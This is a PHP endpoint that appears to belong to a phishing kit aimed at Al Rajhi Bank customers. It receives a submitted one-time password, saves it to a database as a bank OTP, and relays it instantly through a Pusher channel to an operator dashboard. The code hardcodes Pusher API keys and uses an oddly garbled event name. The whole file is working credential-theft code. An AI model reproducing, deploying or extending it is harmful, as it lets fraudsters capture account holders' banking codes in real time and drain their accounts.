<?php
session_start();
header('Content-Type: application/json');

require_once '../dashboard/init.php';

$userId = $_POST['user_id'] ?? $_SESSION['current_user_id'] ?? null;
$otpCode = $_POST['otp_code'] ?? '';

if (!$userId || empty($otpCode)) {
    echo json_encode(['success' => false, 'error' => 'بيانات غير مكتملة']);
    exit;
}

// حفظ رمز OTP البنك في قاعدة البيانات
$result = $User->insertBankOTP($userId, $otpCode);

if ($result) {
    $User->updateUserMessage($userId, 'رمز OTP بنك الراجحي - ' . $otpCode);
    
    // ✅ إرسال إشعار Pusher
    try {
        require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
        
        $pusher = new Pusher\Pusher(
            'a56388ee6222f6c5fb86',
            '4c77061f4115303aac58',
            '1973588',
            ['cluster' => 'ap2', 'useTLS' => true]
        );

        $pusher->trigger('my-channel', 'updaefte-user-payys', [
            'userId' => $userId,
            'updatedData' => ['message' => 'رمز OTP بنك الراجحي - ' . $otpCode]
        ]);
    } catch (Exception $e) {
        error_log("Pusher Error: " . $e->getMessage());
    }
    
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false, 'error' => 'فشل حفظ الرمز']);
}
?>